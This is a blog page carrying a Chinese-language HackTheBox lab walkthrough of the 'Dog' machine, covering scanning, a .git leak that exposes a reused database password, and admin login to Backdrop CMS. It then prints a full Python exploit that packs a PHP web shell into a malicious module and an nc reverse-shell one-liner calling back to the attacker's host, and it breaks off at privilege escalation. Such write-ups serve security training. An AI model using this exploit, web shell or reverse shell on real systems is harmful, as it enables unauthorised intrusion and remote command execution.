<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">HackTheBox - Season7-Dog | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Season7 Dog https://app.hackthebox.com/machines/Dog | esay 前期踩点 10.10.11.58是靶机，进行nmap扫描 扫描出来.git文件夹，那么可能存在git泄露；robots.txt文件 访问HTTP并收集指纹 在主页about中发现域名..." data-next-head=""/><meta property="og:title" content="HackTheBox - Season7-Dog | Sunset Blog" data-next-head=""/><meta property="og:description" content="Season7 Dog https://app.hackthebox.com/machines/Dog | esay 前期踩点 10.10.11.58是靶机，进行nmap扫描 扫描出来.git文件夹，那么可能存在git泄露；robots.txt文件 访问HTTP并收集指纹 在主页about中发现域名..." data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top/2025/04/04/HackTheBoxSeason7-Dog" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-04" data-next-head=""/><meta property="article:modified_time" content="2025-04-04" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Season7-Dog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top/2025/04/04/HackTheBoxSeason7-Dog" data-next-head=""/><link rel="preload" href="/_next/static/css/e3722a685bf8da82.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-04-04","description":"Season7 Dog https://app.hackthebox.com/machines/Dog | esay 前期踩点 10.10.11.58是靶机，进行nmap扫描 扫描出来.git文件夹，那么可能存在git泄露；robots.txt文件 访问HTTP并收集指纹 在主页about中发现域名...","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.sunsetaction.top/2025/04/04/HackTheBoxSeason7-Dog"},"headline":"HackTheBox - Season7-Dog","image":["https://www.sunsetaction.top/images/logo.png"],"dateModified":"2025-04-04","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://www.sunsetaction.top/images/logo.png"}}}</script><link rel="stylesheet" href="/_next/static/css/e3722a685bf8da82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c63903712a141bbb.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/152-7ffe21fb5a44dc33.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-c4e6231a94c4cf98.js" defer=""></script><script src="/_next/static/KmitjrrO37Sagt1EDlr-i/_buildManifest.js" defer=""></script><script src="/_next/static/KmitjrrO37Sagt1EDlr-i/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">HackTheBox - Season7-Dog</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-04</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-04<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><a href="/tag/HackTheBox/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">HackTheBox</span></a><a href="/tag/Linux%E9%9D%B6%E6%9C%BA/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Linux靶机</span></a></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><span>订阅更新：</span><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Dog","contentHtml":"\u003ch1\u003eSeason7-Dog\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Dog\"\u003ehttps://app.hackthebox.com/machines/Dog\u003c/a\u003e | \u003ccode\u003eesay\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003e10.10.11.58\u003c/code\u003e是靶机，进行\u003ccode\u003enmap\u003c/code\u003e扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@kali  ~/Desktop/test/Dog  nmap -sT -min-rate 10000 -p-  10.10.\n11.58\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 20:55 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.58\nHost is up (0.14s latency).\nNot shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 24.98 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出来\u003ccode\u003e.git\u003c/code\u003e文件夹，那么可能存在\u003ccode\u003egit\u003c/code\u003e泄露；\u003ccode\u003erobots.txt\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Dog  nmap -sT -A -T4 -O -p 22,80 10.10.11.58   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 20:56 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.58                                              \nHost is up (0.18s latency).                                                   \n                                                                              \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:             \n|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)                                                                                               \n|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)                                                                                              \n|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)                                                                                            \n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                          \n|_http-title: Home | Dog                                                                                                                                     \n| http-robots.txt: 22 disallowed entries (15 shown)      \n| /core/ /profiles/ /README.md /web.config /admin \n| /comment/reply /filter/tips /node/add /search /user/register \n|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Backdrop CMS 1 (https://backdropcms.org)\n| http-git:             \n|   10.10.11.58:80/.git/ \n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file \u003cspan class=\"hljs-string\"\u003e'description'\u003c/span\u003e to name the...        \n|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...\n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A \nor 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)                                      \nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops                                                      \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel        \n                                                                              \nTRACEROUTE (using proto 1/icmp)                                               \nHOP RTT       ADDRESS                                                         \n1   179.23 ms 10.10.16.1\n2   132.86 ms 10.10.11.58\n                                       \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 32.60 seconds        \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问HTTP并收集指纹\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image36.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在主页\u003ccode\u003eabout\u003c/code\u003e中发现域名\u003ccode\u003ehtb.dog\u003c/code\u003e添加到hosts，并且能知道使用的是\u003ccode\u003eBackdrop CMS\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image37.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003egit 泄露\u003c/h2\u003e\n\u003cp\u003e使用\u003ccode\u003egithack\u003c/code\u003e扒拉\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Dog  githack http://dog.htb/.git\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image38.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esetting.php\u003c/code\u003e，知道配置文件在\u003ccode\u003e./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/\u003c/code\u003e ，并且能都得到一组账户?密码\u003ccode\u003eroot:BackDropJ2024DS2024\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$database\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'\u003c/span\u003e;                                                                                           \n\n\u003cspan class=\"hljs-variable\"\u003e$config_directories\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'active'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active'\u003c/span\u003e;  \n\u003cspan class=\"hljs-variable\"\u003e$config_directories\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'staging'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging'\u003c/span\u003e;  \n\n\u003cspan class=\"hljs-variable\"\u003e$settings\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'hash_salt'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ'\u003c/span\u003e;                                                                                      \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试在配置文件中进行搜索，最后通过\u003ccode\u003edog.htb\u003c/code\u003e可以得到一个新用户名\u003ccode\u003etiffany\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Dog/site/dog.htb  grep -rE \u003cspan class=\"hljs-string\"\u003e'dog.htb'\u003c/span\u003e ./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/\n./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        \u003cspan class=\"hljs-string\"\u003e\"tiffany@dog.htb\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e密码碰撞后可以通过\u003ccode\u003etiffany:BackDropJ2024DS2024\u003c/code\u003e 进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image39.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003cp\u003e在后台能发现文件上传点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image40.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是提示未开启ZIP拓展导致无法使用\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003e?q=admin/installer/manual\u003c/code\u003e 可以找到能使用的上传点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image41.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过搜索引擎能找到利用 \u003ca href=\"https://cve-diaries.com/en-technical-analysis-of-backdrop-cms-1-27-1-remote-command-execution-rce-d9e87b2c3cae\"\u003ehttps://cve-diaries.com/en-technical-analysis-of-backdrop-cms-1-27-1-remote-command-execution-rce-d9e87b2c3cae\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eexploit.py\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport os\nimport \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\nimport zipfile\n\ndef create_files():\n    info_content = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\ntype = module\nname = Block\ndescription = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.\npackage = Layouts\ntags[] = Blocks\ntags[] = Site Architecture\nversion = BACKDROP_VERSION\nbackdrop = 1.x\nconfigure = admin/structure/block\n; Added by Backdrop CMS packaging script on 2024-03-07\nproject = backdrop\nversion = 1.27.1\ntimestamp = 1709862662\n\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    shell_info_path = \u003cspan class=\"hljs-string\"\u003e\"shell/shell.info\"\u003c/span\u003e\n    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)\n    with open(shell_info_path, \u003cspan class=\"hljs-string\"\u003e\"w\"\u003c/span\u003e) as file:\n        file.write(info_content)\n\n    shell_content = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n\u0026#x3C;html\u003e\n\u0026#x3C;body\u003e\n\u0026#x3C;form method=\"\u003c/span\u003eGET\u003cspan class=\"hljs-string\"\u003e\" name=\"\u003c/span\u003e\u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebasename\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'PHP_SELF'\u003c/span\u003e]); ?\u003e\u003cspan class=\"hljs-string\"\u003e\"\u003e\n\u0026#x3C;input type=\"\u003c/span\u003eTEXT\u003cspan class=\"hljs-string\"\u003e\" name=\"\u003c/span\u003ecmd\u003cspan class=\"hljs-string\"\u003e\" autofocus id=\"\u003c/span\u003ecmd\u003cspan class=\"hljs-string\"\u003e\" size=\"\u003c/span\u003e80\u003cspan class=\"hljs-string\"\u003e\"\u003e\n\u0026#x3C;input type=\"\u003c/span\u003eSUBMIT\u003cspan class=\"hljs-string\"\u003e\" value=\"\u003c/span\u003eExecute\u003cspan class=\"hljs-string\"\u003e\"\u003e\n\u0026#x3C;/form\u003e\n\u0026#x3C;pre\u003e\n\u0026#x3C;?php\nif(isset(\u003cspan class=\"hljs-variable\"\u003e$_GET\u003c/span\u003e['cmd']))\n{\nsystem(\u003cspan class=\"hljs-variable\"\u003e$_GET\u003c/span\u003e['cmd']);\n}\n?\u003e\n\u0026#x3C;/pre\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    shell_php_path = \u003cspan class=\"hljs-string\"\u003e\"shell/shell.php\"\u003c/span\u003e\n    with open(shell_php_path, \u003cspan class=\"hljs-string\"\u003e\"w\"\u003c/span\u003e) as file:\n        file.write(shell_content)\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e shell_info_path, shell_php_path\n\ndef create_zip(info_path, php_path):\n    zip_filename = \u003cspan class=\"hljs-string\"\u003e\"shell.zip\"\u003c/span\u003e\n    with zipfile.ZipFile(zip_filename, \u003cspan class=\"hljs-string\"\u003e'w'\u003c/span\u003e) as zipf:\n        zipf.write(info_path, arcname=\u003cspan class=\"hljs-string\"\u003e'shell/shell.info'\u003c/span\u003e)\n        zipf.write(php_path, arcname=\u003cspan class=\"hljs-string\"\u003e'shell/shell.php'\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e zip_filename\n\ndef main(url):\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Backdrop CMS 1.27.1 - Remote Command Execution Exploit\"\u003c/span\u003e)\n    time.sleep(3)\n\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Evil module generating...\"\u003c/span\u003e)\n    time.sleep(2)\n\n    info_path, php_path = create_files()\n    zip_filename = create_zip(info_path, php_path)\n\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Evil module generated!\"\u003c/span\u003e, zip_filename)\n    time.sleep(2)\n\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Go to \"\u003c/span\u003e + url + \u003cspan class=\"hljs-string\"\u003e\"/admin/modules/install and upload the \"\u003c/span\u003e + zip_filename + \u003cspan class=\"hljs-string\"\u003e\" for Manual Installation.\"\u003c/span\u003e)\n    time.sleep(2)\n\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Your shell address:\"\u003c/span\u003e, url + \u003cspan class=\"hljs-string\"\u003e\"/modules/shell/shell.php\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    import sys\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e len(sys.argv) \u0026#x3C; 2:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Usage: python script.py [url]\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        main(sys.argv[1])\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行后即可拿到后台文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image42.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Dog/image43.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e填入反弹shell命令，即可获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003erm\u003c/span\u003e /tmp/f;\u003cspan class=\"hljs-built_in\"\u003emkfifo\u003c/span\u003e /tmp/f;\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /tmp/f|/bin/bash -i 2\u003e\u0026#x26;1|nc 10.10.16.4 1234 \u003e/tmp/f\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Dog  nc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.16.4] from (UNKNOWN) [10.10.11.58] 52554\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (1003): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nwww-data@dog:/var/www/html/modules/shell$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e查看后台运行的程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@dog:/var/www/html$ ss -tupl\nss -tupl\nNetid State   Recv-Q  Send-Q   Local Address:Port     Peer Address:Port Process \nudp   UNCONN  0       0              